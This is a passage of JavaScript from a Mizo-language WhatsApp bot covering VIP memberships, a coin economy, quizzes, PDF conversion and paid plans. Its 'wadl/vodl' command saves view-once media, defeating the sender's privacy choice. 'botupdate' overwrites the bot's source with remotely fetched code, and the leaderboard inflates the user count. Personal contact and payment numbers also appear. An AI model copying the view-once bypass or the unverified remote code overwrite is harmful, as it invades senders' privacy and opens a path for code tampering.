        const response = await fetch(`https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/${FILE_NAME}`);
        let existingData = [];
        if (response.ok) {
            existingData = await response.json();
        } else {
            dodoi("Repository ah file hmuh a ni lo a, A thar siam a ngai");
        }
        const updatedData = mergeVIPData(existingData, content);
        fs.mkdirSync(path.dirname(filePath), { recursive: true });
        fs.writeFileSync(filePath, JSON.stringify(updatedData, null, 2));
        await git.addConfig('user.name', 'HBMods-OFC');
        await git.addConfig('user.email', 'herberthmar20@gmail.com'); 
        await git.add(FILE_NAME);
        await git.commit('Bot-Update');
        dodoi("...");
        await git.push('origin', 'master');
    } catch (err) {
        dodoi(`Error a awm: ${err.message}`);
    } finally {
        try {
            if (fs.existsSync(TEMP_DIR)) {
                fs.rmSync(TEMP_DIR, { recursive: true, force: true });
            }
        } catch (cleanupErr) {
            dodoi("Error during cleanup:", cleanupErr);
        }
    }
}
function mergeVIPData(existingData, newData) {
    const updatedData = existingData.map((entry) => {
        const match = newData.find((item) => item.id === entry.id);
        return match ? { ...entry, ...match } : entry;
    });
    newData.forEach((item) => {
        if (!updatedData.find((entry) => entry.id === item.id)) {
            updatedData.push(item);
        }
    });
    return updatedData;
}
const { PDFDocument, StandardFonts, rgb } = require("pdf-lib");
async function imagesToPDF(imagePaths, sender) {
    const pdfDoc = await PDFDocument.create();
    for (let imgPath of imagePaths) {
        const imgBytes = fs.readFileSync(imgPath);
        const img = await pdfDoc.embedJpg(imgBytes);
        const { width, height } = img.size();
        const page = pdfDoc.addPage([width, height]);
        page.drawImage(img, { x: 0, y: 0, width, height });
    }
    const pdfPath = path.join("asset/trash", `pictopdf-${sender}.pdf`);
    fs.writeFileSync(pdfPath, await pdfDoc.save());
    return pdfPath;
}

db.users.pictopdfDB = db.users.pictopdfDB || {};
let pictopdfDB = db.users.pictopdfDB;
if (pictopdfDB[m.sender] && m.mtype === "imageMessage") {
    const media = await m.download();
    const imgPath = path.join("asset/trash", `${m.sender}-${Date.now()}.jpg`);
    fs.writeFileSync(imgPath, media);
    pictopdfDB[m.sender].push(imgPath);
    db.users.pictopdfDB = pictopdfDB;
    return dodoi(`📂 I duh tawk hunah "done" tih rawn type la, ti chuan PDF in ka rawn thawn ang che.`);
}

if (pictopdfDB[m.sender] && m.text.toLowerCase() === "done") {
    const userId = m.sender;
    if (pictopdfDB[userId].length === 0) {
        return dodoi("📂 Image pakhat mah store a la nih loh avangin, done thei a la ni lo,");
    }
    const pdfPath = await imagesToPDF(pictopdfDB[userId], userId);
    await HBWABotMz.sendMessage(m.chat, {
        document: { url: pdfPath },
        mimetype: "application/pdf",
        fileName: "pictopdf.pdf"
    }, { quoted: m });
    pictopdfDB[userId].forEach(file => fs.unlinkSync(file));
    delete pictopdfDB[userId];
    db.users.pictopdfDB = pictopdfDB;
    return finishreact()
}
if (pictopdfDB[m.sender] && m.text.toLowerCase() === "cancel") {
    const userId = m.sender;
    if (pictopdfDB[userId].length === 0) {
        delete pictopdfDB[userId];
        db.users.pictopdfDB = pictopdfDB;
        return dodoi("📂 Session tih tawp a ni.");
    }
    pictopdfDB[userId].forEach(file => fs.unlinkSync(file));
    delete pictopdfDB[userId];
    db.users.pictopdfDB = pictopdfDB; 
    return dodoi("Pictopdf session i canceled, avangin image store sa zawng zawng delete vek a ni");
}

switch (isCommand) {
case 'leaderboard':
case 'lb':
case 'richest': {
  try {
    const guildID = "cara";
    const top = await lb(guildID, 10);
    const totalUsers = await Economy.countDocuments({ guildID });

    if (!top || top.length === 0) {
      return HBWABotMz.sendMessage(m.chat, {
        text: "🚫 No data in the leaderboard."
      }, { quoted: m });
    }
    let text = `「 *🏆 Coin Ngah Zual Top 10* 」\n👥 *Total Users:* 2${totalUsers}\n\n`;
    const mentionIDs = [];
    for (let i = 0; i < top.length; i++) {
      const user = top[i];
      const totalBalance = user.wallet + user.bank;
      let displayName;
      if (HerbertTheCreator1) {
        const mentionTag = `@${user.userID.split('@')[0]}`;
        mentionIDs.push(user.userID);
        displayName = mentionTag;
      } else {
        try {
          const name = await HBWABotMz.getName(user.userID);
          displayName = name || "Unknown User";
        } catch {
          displayName = "Unknown User";
        }
      }
      text += `╭═══════════┈\n`;
      text += `┃♕ *${i + 1}. ${displayName}*\n`;
      text += `┃⛃ Wallet: ${user.wallet.toLocaleString()}\n`;
      text += `┃𖠿 Bank: ${user.bank.toLocaleString()}\n`;
      text += `┃⨭ Total: ${totalBalance.toLocaleString()}\n`;
      text += `╰════════════──┈\n`;
    }
    const messageData = { text };
    if (HerbertTheCreator1) messageData.mentions = mentionIDs;
    await HBWABotMz.sendMessage(m.chat, messageData, { quoted: m });
  } catch (err) {
    console.error("❌ Leaderboard Error:", err);
    HBWABotMz.sendMessage(m.chat, {
      text: "❌ Failed to fetch leaderboard."
    }, { quoted: m });
  }

  break;
}



case 'addvip': {
    if (!HerbertTheCreator1) return dodoi(mess.owner);
    if (m.sender == "919863840872@s.whatsapp.net") return;
    let inputText = text || (m.quoted && m.quoted.text) || null;
    if (!inputText) {
        return dodoi(`A hnuaia entirna ang hian hman tur a ni\nEntirnan: ${prefix + command} @tag|time(days)`);
    }
    const [numb, time] = inputText.split('|');
    await loadingreact();   
    const tukrama = numb.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    const whatsappem = await HBWABotMz.onWhatsApp(tukrama); 
    if (!whatsappem.length > 0) {
        return dodoi('I number rawn dah hian WhatsApp a khawih lo!');
    }
    let kumtinvip2;
    const kumtinvip = moment.tz('Asia/Kolkata').format('YYYY-MM-DD');
    if (time.toLowerCase() === 'lifetime') {
        kumtinvip2 = 'lifetime';
    } else if (/^\d{4}-\d{2}-\d{2}$/.test(time)) {
        if (!moment(time, 'YYYY-MM-DD', true).isValid()) {
            return dodoi("A format hi YYYY-MM-DD hmang rawh");
        }
        if (moment(time).isBefore(kumtinvip)) {
            return dodoi("Date expired hnu dah thei a ni lo");
        }
        kumtinvip2 = time;
    } else {
        let duration, unit;
        if (time.match(/^(\d+)(d|days)$/i)) {
            duration = parseInt(time.match(/^(\d+)/)[0]);
            unit = 'days';
            if (duration > 366) {
                return dodoi("Kumkhat chhung chauh vip plan hi pek theih a ni");
            }
        } else if (time.match(/^(\d+)(m|months)$/i)) {
            duration = parseInt(time.match(/^(\d+)/)[0]);
            unit = 'months';
            if (duration > 12) {
                return dodoi("VIP membership hi 12 months (kum 1) chhung chauh pek theih a ni");
            }
        } else {
            return dodoi(`A hnuaia entirna ang hian hman tur a ni\nEntirnan: ${prefix + command} @tag|time(days/months/YYYY-MM-DD)`);
        }
        kumtinvip2 = moment(kumtinvip).add(duration, unit).format('YYYY-MM-DD');
    }
    await uploadreact();
    const cekUser = vip.find((user) => user.id === tukrama);
    if (cekUser) {
        cekUser.expired = kumtinvip2;
    } else {
        vip.push({ id: tukrama, expired: kumtinvip2 });
    }
    await pushToGitHub(vip);
    if (kumtinvip2 === 'lifetime') {
        dodoi(`@${tukrama.split('@')[0]} hi tun atang minutes 5 hnuah chuan lifetime member a ni tawh ang`); 
        HBWABotMz.sendMessage(tukrama, { text: `Tun atanga minutes 5 hnuah chuan lifetime member i ni tawh ang`}, { quoted: m});
        await sleep(300000);
        if (isBusiness) {
        HBWABotMz.sendMessage(tukrama, { image: {url: approthumb}, caption: `*APPROVE VIP MEMBERSHIP*\n\nTun atang chuan lifetime member i ni tawh ang✅\n\n${prefix}myinfo tih command hmang hian i vip status a active leh active loh i en thei ang`}, { quoted: m });
        await finishreact();
       return
       }
        await HBWABotMz.sendMessage(tukrama,{
           image: {
               url: approthumb
           },
           caption: `*APPROVE VIP MEMBERSHIP*\n\nTun atang chuan lifetime member i ni tawh ang✅\n\n${prefix}myinfo tih command hmang hian i vip status a active leh active loh i en thei ang`,  
           mentions: [m.sender],
           footer: botname,
           buttons: [{
             buttonId: `${prefix}`+"myinfo",
               buttonText: {
                   displayText: "THANKS"
              }
          }],
          viewOnce: true,
          headerType: 6,
       },{quoted:m})
        await finishreact();
    } else {
        dodoi(`@${tukrama.split('@')[0]} hi tun atanga minutes 5 hnuah chuan Date ${kumtinvip2} thleng vip member a ni tawh ang`);
        HBWABotMz.sendMessage(tukrama, { text: `Tun atanga minutes 5 hnuah chuan Date ${kumtinvip2} thleng vip member i ni tawh ang`}, { quoted: m});
        await sleep(300000);
         if (isBusiness) {
        HBWABotMz.sendMessage(tukrama, { image: {url: approthumb}, caption: `*APPROVE VIP MEMBERSHIP*\n\nTun atang chuan Date ${kumtinvip2} thleng vip member i ni tawh ang✅\n\n${prefix}myinfo tih command hmang hian i vip status a active leh active loh i en thei ang`}, { quoted: m });
        await finishreact();
       return
       }
        await HBWABotMz.sendMessage(tukrama,{
           image: { 
               url: approthumb
           },
           caption: `*APPROVE VIP MEMBERSHIP*\n\nTun atang chuan Date ${kumtinvip2} thleng vip member i ni tawh ang✅\n\n${prefix}myinfo tih command hmang hian i vip status a active leh active loh i en thei ang`, 
           mentions: [m.sender],
           footer: botname,
           buttons: [{
             buttonId: `${prefix}`+"myinfo",
               buttonText: {
                   displayText: "THANKS"
              }
          }],
          viewOnce: true,
          headerType: 6,
       },{quoted:m})
        await finishreact();
    }
}
break;

case 'topdf': {
  const outputDir = "asset/trash";
  if (!fs.existsSync(outputDir)) {
    fs.mkdirSync(outputDir, { recursive: true });
  }
  let quotedText = m.quoted && m.quoted.text ? m.quoted.text : null;
  let quotedImages = [];
  if (m.quoted && m.quoted.mtype === "imageMessage") {
    quotedImages.push(m.quoted);
  }
  if (m.quoted && m.quoted.quoted && m.quoted.quoted.mtype === "imageMessage") {
    quotedImages.push(m.quoted.quoted);
  }
  if (!/image/.test(mime) && !quotedText) return dodoi(`Pdf a i convert duh Image emaw text *${prefix + command}* tihin reply rawh`)
  await loadingreact()
  const limit1 = await eco.balance(limitneihtu, kancoins);
  if (hmanzat > limit1.wallet) return await dailylimit();
  let pdfPath;
  if (quotedText) {
 async function createPDF(text) {
        const pdfDoc = await PDFDocument.create();
        let page = pdfDoc.addPage([600, 800]);
        const { width, height } = page.getSize();
        const margin = 50;
        let y = height - margin;
        const normalFont = await pdfDoc.embedFont(StandardFonts.Helvetica);
        const boldFont = await pdfDoc.embedFont(StandardFonts.HelveticaBold);
        const italicFont = await pdfDoc.embedFont(StandardFonts.HelveticaOblique);
        const normalFontSize = 14; 
        const lineSpacing = 4;
        const paragraphSpacing = 10;
        const maxTextWidth = width - 2 * margin;
        function wrapText(text, maxWidth, font, fontSize) {
            const paragraphs = text.split("\n");
            let wrappedLines = [];
            for (let paragraph of paragraphs) {
                const words = paragraph.split(" ");
                let line = "";
                for (let word of words) {
                    let testLine = line.length > 0 ? line + " " + word : word;
                    let textWidth = font.widthOfTextAtSize(testLine, fontSize);
                    if (textWidth < maxWidth) {
                        line = testLine;
                    } else {
                        wrappedLines.push(line);
                        line = word;
                    }
                }
                if (line) wrappedLines.push(line);
                wrappedLines.push(""); // Keep paragraph spacing
            }
            return wrappedLines;
        }
        const wrappedLines = wrapText(text, maxTextWidth, normalFont, normalFontSize);
        for (let line of wrappedLines) {
            let font = normalFont;
            let fontSize = normalFontSize;
            line = line.replace(/\*([^*]+)\*/g, (match, p1) => {
                font = boldFont;
                return p1;
            });
            line = line.replace(/_([^_]+)_/g, (match, p1) => {
                font = italicFont;
                return p1;
            });
            if (line.trim() === "") {
                y -= paragraphSpacing;
            } else {
                page.drawText(line, { x: margin, y, size: fontSize, font, color: rgb(0, 0, 0) });
                y -= fontSize + lineSpacing; 
            }
            if (y < margin) {
                y = height - margin;
                page = pdfDoc.addPage([600, 800]);
            }
        }
        const pdfBytes = await pdfDoc.save();
        const pdfPath = path.join(outputDir, `converted-${Date.now()}.pdf`);
        fs.writeFileSync(pdfPath, pdfBytes);
        return pdfPath;
    }
    pdfPath = await createPDF(quotedText);
  } else if (quotedImages.length > 0) {
    async function imagesToPDF(images) {
      const pdfDoc = await PDFDocument.create();
      for (let imageMessage of images) {
        const media = await imageMessage.download();
        const img = await pdfDoc.embedJpg(media);
        const { width, height } = img.size();
        const page = pdfDoc.addPage([width, height]);
        page.drawImage(img, { x: 0, y: 0, width, height });
      }
      const pdfBytes = await pdfDoc.save();
      const pdfPath = path.join(outputDir, `converted-${Date.now()}.pdf`);
      fs.writeFileSync(pdfPath, pdfBytes);
      return pdfPath;
    }
    pdfPath = await imagesToPDF(quotedImages);
  }
  await uploadreact()
  const filehming = text || `converted-${Date.now()}.pdf`;
  await HBWABotMz.sendMessage(from, { 
    document: { url: pdfPath }, 
    mimetype: "application/pdf", 
    fileName: filehming
  }, {quoted:m});
  await finishreact()
  setTimeout(() => { fs.unlinkSync(pdfPath); }, 10000);
  await eco.deduct(limitneihtu, kancoins, hmanzat);
  await eco.give(limitneihtu, kantitle, hmanzat2);
}
break;

case 'pictopdf': {
const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) return await dailylimit();
    await loadingreact();
const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
    let sender = m.sender;
    if (!pictopdfDB[sender]) {
        pictopdfDB[sender] = [];
        db.users.pictopdfDB = pictopdfDB;
        return dodoi("📂 Thlalak rawn thawn la, i rawn thawn zawh hunah chuan 'done' tiin rawn type la, ti chuan PDF in ka rawn thawn ang che\nCancel i duh chuan chuan 'cancel' tih rawn thawn mai rawh");
    }
    return dodoi("📂 pictopdf session hi a active make a! Image thawn la, 'done' tih type rawh.");
}
break;


case `wadl`: case `vodl`: {
    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
    if (!m.quoted) return dodoi('Viewonce media reply rawh');
    await loadingreact()
    const directory = './';
    const fileRegex = /^(lib|temp_).*\.(jpg|png|gif|mp4)$/i;
    if (m.quoted.mtype !== 'viewOnceMessageV2') {
      let vawk = await m.quoted.download();
    let mime = m.quoted.mimetype || '';
    if (mime.startsWith('video/')) {
    await HBWABotMz.sendMessage(m.chat, { video: vawk }, { quoted: m });
    } else if (mime.startsWith('image/')) {
    await HBWABotMz.sendMessage(m.chat, { image: vawk }, { quoted: m });
    }
    await finishreact()
   return }
    let msg = m.quoted.message;
    let type = Object.keys(msg)[0];
    let media = await downloadContentFromMessage(msg[type], type === 'imageMessage' ? 'image' : 'video');
    let buffer = Buffer.from([]);
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk]);
    }
    let options = {
        caption: msg[type]?.caption || '',
        quoted: m
    };
    if (/video/.test(type)) {
    await uploadreact()
        await HBWABotMz.sendMessage(m.chat, { video: buffer, ...options },{ quoted: m});
fs.readdir(directory, (err, files) => {
    if (err) {
        console.error(`Error reading directory: ${err.message}`);
        return;
    }
    files.forEach((file) => {
        if (fileRegex.test(file)) {
            const filePath = path.join(directory, file);
            fs.unlink(filePath, (err) => {
                if (err) {
                    console.error(`Error deleting file "${file}": ${err.message}`);
                } else {
                    console.log(`Deleted file: ${file}`);
                }
            });
        }
    });
});
await finishreact()
    } else if (/image/.test(type)) {
    await uploadreact()
        await HBWABotMz.sendMessage(m.chat, { image: buffer, ...options },{ quoted: m});
        fs.readdir(directory, (err, files) => {
    if (err) {
        console.error(`Error reading directory: ${err.message}`);
        return;
    }
    files.forEach((file) => {
        if (fileRegex.test(file)) {
            const filePath = path.join(directory, file);
            fs.unlink(filePath, (err) => {
                if (err) {
                    console.error(`Error deleting file "${file}": ${err.message}`);
                } else {
                    console.log(`File tangkai lo deleted: ${file}`);
                }
            });
        }
    });
});
await finishreact()
    }
}
break;
case 'addpr': case 'addprem': case 'addpremium': {
    if (!HerbertTheCreator2) return dodoi(mess.owner); 
    if (!text) return dodoi(`A hnuaia entirna ang hian hman tur a ni\nEntirnan: ${prefix + command} @tag|time(days)`);   
    const [numb, days] = text.split('|');
    const tukrama = numb.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    const whatsappem = await HBWABotMz.onWhatsApp(tukrama);    
    if (!whatsappem.length > 0) return dodoi('Number pek hi WhatsApp contact dik tak a ni lo!');    
    const kumtinvip = moment.tz('Asia/Kolkata').format('YYYY-MM-DD');
    const kumtinvip2 = moment(kumtinvip).add(parseInt(days), 'days').format('YYYY-MM-DD');
    if (!days) {
        return dodoi(`Khawngaihin a hun chhung ni zat tur rawn tarlang tel rawh!\nEntirnan: ${prefix + command} @tag|time(days)`);
    }
    const cekUser = premium.find((user) => user.id === tukrama);
    if (cekUser) {
        cekUser.expired = kumtinvip2;
       dodoi(`@${tukrama.split('@')[0]} hi a premium expiry date ni ${days} chhung atan update a ni`);
    } else {
        const obj = {
            id: tukrama,
            expired: kumtinvip2,
        };
        premium.push(obj);
        dodoi(`@${tukrama.split('@')[0]} hi ni ${days} chhung chu premium member atan dah a ni tawh.`);
    }
    fs.writeFileSync('./asset/database/premium.json', JSON.stringify(premium, null, 2));
    break;
}
			case 'delpr': case 'delprem': case 'delpremium': {
if (!HerbertTheCreator) return dodoi(mess.owner)
if (!text) return dodoi(`Entirnan\n${prefix + command} @tag`)
const tukrama = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
if (prem.checkPremiumUser(tukrama, premium)) {
	premium.splice(prem.getPremiumPosition(tukrama, premium), 1);
	fs.writeFileSync('./asset/database/premium.json', JSON.stringify(premium));
	dodoi(`Premium atangin @${tukrama.split('@')[0]} hi paih a ni`)
} else {
	dodoi(`@${tukrama.split('@')[0]} hi premium member a ni lo`)
}
			}
			break
case 'listpr': case 'listprem': case 'listpremium': {
if (!HerbertTheCreator) return dodoi(mess.owner)
let txt = `「 *👑Premium Member List👑* 」\n\n`;
for (let userprem of premium) {
 txt += `╭═══════════┈\n`
 txt += `┃♕ ID: @${userprem.id.split('@')[0]}\n`
 txt += `┃♕ Exp: ${(userprem.expired)}\n`
 txt += `╰════════════──┈\n\n`
}
 await HBWABotMz.sendMessage(from,{text:txt,mentions: await HBWABotMz.parseMention(txt), },{quoted:m})
			}
break
case 'botupdate' : {
if (!HerbertTheCreator && !HerbertTheCreator1) return dodoi(mess.owner)
const fileUrl = 'https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/HBWABot-Mz/HBWABot-Mz.js';
const filePath = './HBWABot-Mz.js';
axios.get(fileUrl, { responseType: 'stream' })
  .then(response => {
    const fileSize = response.headers['content-length'];
    if (fileSize && fileSize < 2 * 1024 * 1024) {
      const file = fs.createWriteStream(filePath);
      response.data.pipe(file);
      file.on('finish', () => {
        dodoi(`Bot updated`, 'yellow')
      });
      file.on('error', err => {
        dodoi('File download laiin hetah hian error a awm: ')
      });
    } else {
      dodoi('2MB aia sang install thei a ni lo.');
    }
  })
  .catch(error => {
    dodoi('File download laiin hetah hian error a awm: ');
  });
    }
    break

case 'autoai': {
    const userId = m.sender;
    if (text === 'on') {
        if (autoai_op[m.sender]) {
            return dodoi(`• Auto AI hi i on sa a nih avangin on double theih a ni lo`);
        }
        autoai_op[userId] = { sessionChat: [] };
        db.users.autoai_op = autoai_op;
        dodoi(`• Tun atangin auto ai chu i hmang thei tawh ang`);     
    } 
    else if (text === 'off') {
        if (!autoai_op[m.sender]) {
            return dodoi(`• Auto AI hi i off sa a nih avangin off double theih a ni lo`);
        }
        delete autoai_op[userId];
        db.users.autoai_op = autoai_op;
        dodoi(`• Auto Ai chu disabled a nih tawh avangin i on leh hma chuan hman chhunzawm theih a ni rih lo ang`);
    } 
    else {
        return dodoi(`• _🤖Khatiang ringawt loh khan, he tiang hian option (on/off) nen hman tur a ni;_\n${prefix}${prefix + command} on`);
    }
}
break;
case 'biblequiz':
    case 'mbq': {   
    const today = new Date();
    const isSundayOrSaturday = today.getDay() === 0 || today.getDay() === 6;
    if (!isSundayOrSaturday) return dodoi("He features hi Inrinni leh Pathianni ah chauh khel thei a ni!!");
    if (bibleUsageCount < 15) {
        if (_biblequiz.hasOwnProperty(m.sender.split('@')[0])) {
            return dodoi(`Zawhna ila chhang zo lo 🤌`);
        }
        let bbquiz = await fetchJson('https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/HBWABot-Mz/biblequiz.json');
        let result = bbquiz[Math.floor(Math.random() * bbquiz.length)];
        let mult = "`Multiple Choice Questions`";
        let englolo = await HBWABotMz.sendMessage(m.chat, { text: `> ${mult}\n${result.zawhna}\nAns: ___________`, contextInfo:{"externalAdReply": {"showAdAttribution": true, "containsAutoReply": true, "title": `Mizo Bible Quiz`,"body": `Coins hlawh theihna`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./asset/image/MizoBibleQ.png`),"sourceUrl": ``}}}, { quoted: m });
       _biblequiz[m.sender.split('@')[0]] = result.achhanna.toLowerCase()
       bibleUsageCount++;
        } else {
    return dodoi('Bot restart a nih hunah he features hi i hmang chhunzawm leh thei chauh ang')
  }
  }
        break;

case 'mizoquiz': {
    const userKey = m.sender.split('@')[0];
    if (_mizoquiz.hasOwnProperty(userKey) && isZawhna) {
        return dodoi('I in surrender dawn loh chuan zawhna chhang zo hmasa phawt rawh!')
    }
    try {
        const kaurl = await fetchJson('https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/HBWABot-Mz/mizoquiz.json')
        const random = kaurl[Math.floor(Math.random() * kaurl.length)];

        await HBWABotMz.sendText(m.chat, `Zawhnate hi one by one a chhan tur a ni a, chhanna hi Minute 2 ral hmaa chhan zo hman vek tur a ni!!`, m)

        const zawhnaq = `*Answer The Following :*\n*Q.* ${random.zawhna}\n\nCHHAN TUR AWM ZAT [ *${random.chhanna.length}* ] ${(random.chhanna.some(v => v.includes(' ') || v.includes('.'))) ? `(Chhana Thenkhatah chuan space leh fullstop hman a ngai ang)` : ''}`.trim()

        _mizoquiz[userKey] = {
            id: [userKey],
            hbwabotid: await HBWABotMz.sendText(m.chat, zawhnaq, m),
            ...random,
            bodaih: Array.from(random.chhanna, () => false),
            hadiah: 1,
            tawphun: setTimeout(() => {
                if (_mizoquiz[userKey]) HBWABotMz.sendText(m.chat, `Minute 2 a zo, Chhan theih hun chhung a tawp`, m)
                delete _mizoquiz[userKey];
            }, 120000),
        };
    } catch (error) {
        console.error('Error fetching or processing quiz:', error)
        dodoi('Result tur ka lak laiin error awm!')
    }
}
break;


case 'picquiz': {
    if (thlalakquiz.hasOwnProperty(m.sender.split('@')[0])) {
        return dodoi(`Zawhna ila chhang zo lo 🤌`)
    }
    let picquiz = await fetchJson('https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/HBWABot-Mz/thlalakquiz.json')
    let result = picquiz[Math.floor(Math.random() * picquiz.length)];
    let englolo = await HBWABotMz.sendMessage(m.chat, { image: { url: `${result.url}` }, caption: `${result.zawhna}\n
\n_🕑Minute 1 hun i nei_` }, { quoted: m })
    thlalakquiz[m.sender.split('@')[0]] = result.achhanna.toLowerCase()
    await sleep(60000)
    if (thlalakquiz.hasOwnProperty(m.sender.split('@')[0])) {
        HBWABotMz.sendMessage(m.chat, { text: `🕑Hun a tawp...\nA chhanna dik chu:  
*${thlalakquiz[m.sender.split('@')[0]]}* a ni` }, { quoted: englolo })
        delete thlalakquiz[m.sender.split('@')[0]];
    }
}
break;



case 'c1': {

if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
if (!HerbertTheCreator1) return
HBWABotMz.sendMessage(from, { react: { text: "🫡" , key: m.key }})
let value = text.trim().split(" ")
if (value[0] === "") return
const target =
m.quoted && m.mentionedJid.length === 0
? m.quoted.sender
: m.mentionedJid[0] || null;
if (m.quoted?.sender && !m.mentionedJid.includes(m.quoted.sender)) m.mentionedJid.push(m.quoted.sender)
while (m.mentionedJid.length < 2) m.mentionedJid.push(m.sender)
const hnekang = target
const balance = await eco.balance(hnekang, kancoins)
await dodoi(`Sir, a coins neihzat chu:  🪙${balance.wallet} 🤔`)
}
break 

case 'cutdm':{

if (!HerbertTheCreator1) return
HBWABotMz.sendMessage(from, { react: { text: "🫡" , key: m.key }})
let value = text.trim().split(" ")
if (value[0] === "") return
const target =
m.quoted && m.mentionedJid.length === 0
? m.quoted.sender
: m.mentionedJid[0] || null;
if (m.quoted?.sender && !m.mentionedJid.includes(m.quoted.sender)) m.mentionedJid.push(m.quoted.sender)
while (m.mentionedJid.length < 2) m.mentionedJid.push(m.sender)
const hmela = target
const paihsakna = await eco.deduct(hmela, kancoins, value[0])
const balance = await eco.balance(hmela, kancoins)
await dodoi(`🫡Sir, hei zawng hi a la bang : _${balance.wallet}🪙_\nI la cut leh dawn em sir ?🙋‍♂️`)
}
break

case 'limit': case 'dawntur': case 'claim': case 'daily': {
if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
let user = m.sender
const cara = "cara" 
if (!isVip && !isVip) {
HBWABotMz.sendMessage(from, { react: { text: "💰" , key: m.key }})
const daily3 = await eco.daily(limitneihtu, kancoins, dawnzat)
if (daily3.cd) return dodoi(`♻️ I claim tawh, ${daily3.cdL} a ral hunah i claim leh thei chauh ang`)
dodoi(`Vawiin atan hengte hi i claim a, dakar 24 ral hunah i claim leh thei ang!!
*Coin* :  🪙 ${dawnzat} ✓
VIP member te chuan Coin 🪙  2000 an dawng thei a ni!!..\n\nI coins neih zat hriat i duh chuan *myinfo* tih rawn type rawh!!`)
return 
}
if (isExp) {
HBWABotMz.sendMessage(from, { react: { text: "🕡" , key: m.key }})
const daily5 = await eco.daily(limitneihtu, kancoins, dawnzat)
if (daily5.cd) return dodoi(`🕡 I claim tawh, ${daily5.cdL} a ral hunah i claim leh thei chauh ang`)
dodoi(`> I VIP Subscription A Tawp Tawh!!..
Vawiin atan hengte hi i claim a, dakar 24 ral hunah i claim leh thei ang!!
*Coin* :  🪙 ${dawnzat} ✓
I coins neih zat hriat i duh chuan *myinfo* tih rawn type rawh!!`)
return
}
HBWABotMz.sendMessage(from, { react: { text: "👑" , key: m.key }})
const daily1 = await eco.daily(limitneihtu, kancoins, 2000)
if (daily1.cd) return dodoi(`👑 I claim tawh, ${daily1.cdL} a ral hunah i claim leh thei chauh ang`)
dodoi(`Vawiin atan hengte hi i claim a, dakar 24 ral hunah i claim leh thei ang!!
*Coin* : 🪙  2000 ✓

I coins neih zat hriat i duh chuan *myinfo* tih rawn type rawh!!`)
}
break

case 'hb2ab95': {

    const freevip = "frvip2";
    const ckfrvip1 = "ckfrvip3";
    const limit23 = await eco.balance(limitneihtu, ckfrvip1);
    if (limit23.wallet < 10) {
        await eco.give(limitneihtu, freevip, 50);
        await eco.give(limitneihtu, ckfrvip1, 20);
        await dodoi("🎟️VIP 50 time Free Trial i dawng e✓");
        return;
    }
    await HBWABotMz.sendMessage(from, { 
        react: { 
            text: "🎟️",
            key: m.key 
        }
    });
}
break;
case 'pawme/': {
const tAndS = await eco.balance(limitneihtu, privacy11);
    if (tAndS.wallet < 10) {
        await eco.give(limitneihtu, privacy11, 10);
        await dodoi("Kan Terms of Service, i pawm avangin tun atangin min hmang thei tawh ang!");
        return;
    }
    await HBWABotMz.sendMessage(from, { 
        react: { 
            text: "😊",
            key: m.key 
        }
    });
}
break;

case 'buyvip': {
    const ckfrvip1 = "ckfrvip3";
    const vawiinni2 = await mizo_tawnga_translate_na.translate(asource1, atarget1, athulo1)
    const limit23 = await eco.balance(limitneihtu, ckfrvip1);
    const englovip = ('https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/VIP/info.json')
    const img = buyvipthumb
    HBWABotMz.sendMessage(m.sender, { react: { text: "😎" , key: m.key }})
const englovip1 = await fetch(englovip)
const englovip2 = await englovip1.json()
const englovip3 = englovip2['10days'];
const englovip4 = englovip2['20days'];
const englovip5 = englovip2['1month'];
const englovip6 = englovip2['2month'];
const englovip7 = englovip2['lifetime'];
const englovip8 = englovip2.info;
    if (!isVip && limit23.wallet < 10) {
    await dodoi("> VIP FREE Trial La Claim loh i nei\nPrivate Chat-ah VIP Plan i en theih turin ka rawn thawn e")
     if (isBusiness) {
        HBWABotMz.sendMessage(m.chat, { image: {url: buyvipthumb}, caption: `> Vip trial la claim loh ila neia hb2ab95 tih rawn type la, Vip i lei hmain vip features vawi 10 i hmang thei ang!!
*👑 ${botname}*
*To Become VIP Membership, please follow these steps!!👑*
'*Note :* To become a VIP member, you need to pay a fee. Before paying, you must review one requirement. See our plan then choose your preferred option by typing the command key like as i provide in the square bracket,

'10days': '₹20', [ myid1 ]
'20days': '₹40', [ myid2 ]
'1month': '₹50', [ myid3 ]
'2month': '₹100', [ myid4 ]
'1year: ~₹600,~ [ myid5 ] ₹500✓ 2month free
`}, { quoted: m });
       return
       }
         let msg = generateWAMessageFromContent(m.sender, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: ''
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: 'GPay : 8416093656'
        }),
         header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : {url : img}}, { upload: HBWABotMz.waUploadToServer})), 
                  title: `> Vip trial la claim loh ila neia free plan khu select la, Vip i lei hmain vip features vawi 10 i hmang thei ang!!

*👑 ${botname}*
${englovip8}`,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "VIEW PLAN",
                sections: [
                  {
                    title: "I DUH BER SELECT RAWH",
                    rows: [
                     {
                        title: "VIP Vawi10 hman theihna",
